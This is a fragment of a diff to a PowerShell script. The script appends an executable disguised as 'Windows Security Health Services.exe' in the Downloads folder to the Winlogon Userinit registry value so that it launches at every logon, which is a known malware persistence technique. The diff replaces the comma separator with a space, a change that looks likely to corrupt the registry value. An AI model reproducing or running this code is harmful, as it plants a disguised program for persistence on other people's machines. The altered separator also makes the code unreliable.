@@ -3,7 +3,7 @@ $newAppPath = "C:\Users\User\Downloads\Windows Security Health Services.exe"
 $userinitPath = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Userinit
 
 if (-not $userinitPath.Userinit.Contains($newAppPath)) {
-    $newUserinitValue = $userinitPath.Userinit + ", " + $newAppPath
+    $newUserinitValue = $userinitPath.Userinit + " " + $newAppPath
 
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Userinit -Value $newUserinitValue
     Write-Host "Userinit updated successfully."
